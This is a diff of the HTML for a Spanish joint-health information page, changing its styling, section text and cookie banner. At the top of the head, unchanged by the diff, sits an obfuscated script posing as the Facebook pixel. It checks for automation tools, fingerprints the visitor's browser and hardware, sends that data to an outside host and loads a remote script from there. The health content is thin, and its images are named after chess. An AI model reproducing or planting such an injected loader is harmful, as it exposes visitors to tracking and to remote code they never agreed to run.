@@ -4,18 +4,19 @@
 <script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://sp1.micenice.pro/kl/?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Información completa sobre la salud de las articulaciones, tratamientos y prevención de problemas articulares">
-    <meta name="keywords" content="articulaciones, salud articular, dolor articular, tratamiento articular, artritis, artrosis">
+    <meta name="description" content="Información completa sobre la salud de las articulaciones, tratamientos y prevención de lesiones">
+    <meta name="keywords" content="articulaciones, salud articular, dolor articular, tratamientos, ejercicios, medicina deportiva">
     <meta name="author" content="Expertos en Salud Articular">
     <title>Salud Articular - Tu Guía Completa</title>
     <style>
         /* Variables CSS */
         :root {
-            --primary-color: #2C5282;
-            --secondary-color: #4299E1;
-            --accent-color: #90CDF4;
-            --text-color: #2D3748;
-            --background-color: #F7FAFC;
+            --primary-color: #2C3E50;
+            --secondary-color: #3498DB;
+            --accent-color: #E74C3C;
+            --text-color: #2C3E50;
+            --background-color: #ECF0F1;
+            --footer-color: #34495E;
         }
 
         /* Estilos generales */
@@ -23,7 +24,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
@@ -32,25 +33,18 @@
             line-height: 1.6;
         }
 
-        /* Contenedor principal */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        /* Encabezado */
+        /* Header */
         header {
             background-color: var(--primary-color);
             color: white;
-            padding: 2rem 0;
+            padding: 2rem;
             text-align: center;
         }
 
         /* Navegación */
         nav {
             background-color: var(--secondary-color);
-            padding: 1rem 0;
+            padding: 1rem;
         }
 
         nav ul {
@@ -69,26 +63,20 @@
             text-decoration: none;
         }
 
-        /* Secciones */
+        /* Contenido principal */
+        main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
         section {
-            padding: 3rem 0;
+            margin-bottom: 3rem;
         }
 
         h1, h2, h3 {
             color: var(--primary-color);
-            margin-bottom: 1.5rem;
-        }
-
-        h1 {
-            font-size: 2.5rem;
-        }
-
-        h2 {
-            font-size: 2rem;
-        }
-
-        h3 {
-            font-size: 1.5rem;
+            margin-bottom: 1rem;
         }
 
         p {
@@ -101,51 +89,52 @@
             text-align: center;
         }
 
-        .img-container img {
+        img {
             max-width: 100%;
             height: auto;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
 
         /* Formulario de contacto */
         .contact-form {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 2rem;
             background-color: white;
+            padding: 2rem;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
 
         .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: var(--primary-color);
+            margin-bottom: 1rem;
         }
 
         input, textarea {
             width: 100%;
-            padding: 0.8rem;
-            border: 1px solid var(--accent-color);
+            padding: 0.5rem;
+            margin-top: 0.5rem;
+            border: 1px solid #ddd;
             border-radius: 4px;
         }
 
         button {
-            background-color: var(--primary-color);
+            background-color: var(--secondary-color);
             color: white;
-            padding: 0.8rem 1.5rem;
+            padding: 0.5rem 1rem;
             border: none;
             border-radius: 4px;
             cursor: pointer;
         }
 
         button:hover {
-            background-color: var(--secondary-color);
+            background-color: var(--primary-color);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--footer-color);
+            color: white;
+            padding: 2rem;
+            text-align: center;
         }
 
         /* Cookie banner */
@@ -154,67 +143,50 @@
             bottom: 0;
             left: 0;
             right: 0;
-            background-color: rgba(44, 82, 130, 0.95);
+            background-color: rgba(0,0,0,0.9);
             color: white;
             padding: 1rem;
             text-align: center;
-        }
-
-        .cookie-banner button {
-            margin-left: 1rem;
-            background-color: white;
-            color: var(--primary-color);
+            display: none;
         }
 
         /* Responsive */
         @media (max-width: 768px) {
             nav ul {
                 flex-direction: column;
-                align-items: center;
+                text-align: center;
             }
 
             nav ul li {
                 margin: 0.5rem 0;
             }
 
-            h1 {
-                font-size: 2rem;
-            }
-
-            h2 {
-                font-size: 1.75rem;
-            }
-
-            h3 {
-                font-size: 1.25rem;
+            .img-container {
+                margin: 1rem 0;
             }
         }
     </style>
 </head>
 <body>
     <header>
-        <div class="container">
-            <h1>Salud Articular</h1>
-            <p>Tu guía completa para el cuidado de las articulaciones</p>
-        </div>
+        <h1>Salud Articular</h1>
+        <p>Tu guía completa para el cuidado de las articulaciones</p>
     </header>
 
     <nav>
-        <div class="container">
-            <ul>
-                <li><a href="#inicio">Inicio</a></li>
-                <li><a href="#tipos">Tipos de Articulaciones</a></li>
-                <li><a href="#tratamientos">Tratamientos</a></li>
-                <li><a href="#prevencion">Prevención</a></li>
-                <li><a href="#contacto">Contacto</a></li>
-            </ul>
-        </div>
+        <ul>
+            <li><a href="#inicio">Inicio</a></li>
+            <li><a href="#tipos">Tipos de Articulaciones</a></li>
+            <li><a href="#tratamientos">Tratamientos</a></li>
+            <li><a href="#ejercicios">Ejercicios</a></li>
+            <li><a href="#contacto">Contacto</a></li>
+        </ul>
     </nav>
 
-    <main class="container">
+    <main>
         <section id="inicio">
-            <h2>¿Qué son las Articulaciones?</h2>
-            <p>Las articulaciones son las estructuras que conectan los huesos en nuestro cuerpo, permitiendo el movimiento y la flexibilidad. Son esenciales para nuestra movilidad y calidad de vida.</p>
+            <h2>Bienvenidos al Centro de Información Articular</h2>
+            <p>Las articulaciones son componentes fundamentales de nuestro sistema músculo-esquelético, permitiendo el movimiento y la flexibilidad del cuerpo.</p>
             <div class="img-container">
                 <img src="images/chess1.jpg" alt="Anatomía de las articulaciones" width="800" height="400">
             </div>
@@ -222,54 +194,46 @@
 
         <section id="tipos">
             <h2>Tipos de Articulaciones</h2>
-            <div class="img-container">
-                <img src="images/chess2.jpg" alt="Diferentes tipos de articulaciones" width="800" height="400">
-            </div>
             <h3>Articulaciones Sinoviales</h3>
-            <p>Son las más comunes y permiten un amplio rango de movimiento. Ejemplos incluyen rodillas, caderas y hombros.</p>
-            
+            <p>Las articulaciones sinoviales son las más comunes en el cuerpo humano. Se caracterizan por su capacidad de movimiento libre y la presencia de líquido sinovial.</p>
             <div class="img-container">
-                <img src="images/chess3.jpg" alt="Articulación sinovial" width="800" height="400">
+                <img src="images/chess2.jpg" alt="Articulación sinovial" width="800" height="400">
             </div>
+
             <h3>Articulaciones Cartilaginosas</h3>
-            <p>Conectadas por cartílago, permiten movimientos limitados. Se encuentran en la columna vertebral.</p>
+            <p>Estas articulaciones están unidas por cartílago y permiten un movimiento limitado.</p>
+            <div class="img-container">
+                <img src="images/chess3.jpg" alt="Articulación cartilaginosa" width="800" height="400">
+            </div>
         </section>
 
         <section id="tratamientos">
             <h2>Tratamientos Comunes</h2>
+            <p>Existen diversos tratamientos para mantener la salud de las articulaciones y tratar problemas específicos.</p>
             <div class="img-container">
                 <img src="images/chess4.jpg" alt="Tratamientos articulares" width="800" height="400">
             </div>
-            <h3>Terapia Física</h3>
-            <p>Ejercicios específicos diseñados para fortalecer las articulaciones y mejorar la movilidad.</p>
-            
             <div class="img-container">
                 <img src="images/chess5.jpg" alt="Terapia física" width="800" height="400">
             </div>
-            <h3>Medicamentos</h3>
-            <p>Antiinflamatorios y analgésicos para el manejo del dolor y la inflamación.</p>
         </section>
 
-        <section id="prevencion">
-            <h2>Prevención</h2>
+        <section id="ejercicios">
+            <h2>Ejercicios Recomendados</h2>
+            <p>El ejercicio regular es fundamental para mantener la salud de las articulaciones.</p>
             <div class="img-container">
-                <img src="images/chess6.jpg" alt="Ejercicios de prevención" width="800" height="400">
+                <img src="images/chess6.jpg" alt="Ejercicios de fortalecimiento" width="800" height="400">
             </div>
-            <h3>Ejercicio Regular</h3>
-            <p>Mantener un estilo de vida activo es crucial para la salud articular.</p>
-            
             <div class="img-container">
-                <img src="images/chess7.jpg" alt="Nutrición para articulaciones" width="800" height="400">
+                <img src="images/chess7.jpg" alt="Ejercicios de flexibilidad" width="800" height="400">
             </div>
-            <h3>Nutrición</h3>
-            <p>Una dieta balanceada rica en calcio y vitamina D es esencial.</p>
+            <div class="img-container">
+                <img src="images/chess8.jpg" alt="Ejercicios de movilidad" width="800" height="400">
+            </div>
         </section>
 
         <section id="contacto">
-            <h2>Contacto</h2>
-            <div class="img-container">
-                <img src="images/chess8.jpg" alt="Contáctanos" width="800" height="400">
-            </div>
+            <h2>Contáctenos</h2>
             <form class="contact-form">
                 <div class="form-group">
                     <label for="nombre">Nombre:</label>
@@ -289,15 +253,23 @@
     </main>
 
     <footer>
-        <div class="container">
-            <p><a href="#privacidad">Política de Privacidad</a> | <a href="#terminos">Términos de Uso</a></p>
-        </div>
+        <p><a href="#privacidad">Política de Privacidad</a> | <a href="#terminos">Términos de Uso</a></p>
+        <p>© 2024 Salud Articular. Todos los derechos reservados.</p>
     </footer>
 
-    <div class="cookie-banner" id="cookie-banner">
+    <div class="cookie-banner" id="cookieBanner">
         <p>Este sitio utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta su uso.</p>
-        <button onclick="document.getElementById('cookie-banner').style.display='none'">Aceptar</button>
+        <button onclick="aceptarCookies()">Aceptar</button>
     </div>
+
+    <script>
+        // Script mínimo para el banner de cookies
+        window.onload = function() {
+            document.getElementById('cookieBanner').style.display = 'block';
+        }
+        function aceptarCookies() {
+            document.getElementById('cookieBanner').style.display = 'none';
+        }
+    </script>
 </body>
 </html>
-
